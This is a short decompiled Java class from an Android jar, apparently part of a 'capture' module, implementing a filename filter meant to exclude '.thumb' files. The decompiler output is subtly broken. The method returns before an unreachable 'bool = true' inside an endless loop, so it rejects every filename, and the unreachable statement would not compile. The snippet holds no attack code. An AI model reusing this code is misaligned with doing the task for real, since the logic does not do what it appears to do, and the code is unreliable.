package com.vvt.capture.c;

import java.io.File;
import java.io.FilenameFilter;

final class d
  implements FilenameFilter
{
  public boolean accept(File paramFile, String paramString)
  {
    String str = ".thumb";
    boolean bool = paramString.endsWith(str);
    if (bool)
    {
      bool = false;
      str = null;
    }
    for (;;)
    {
      return bool;
      bool = true;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */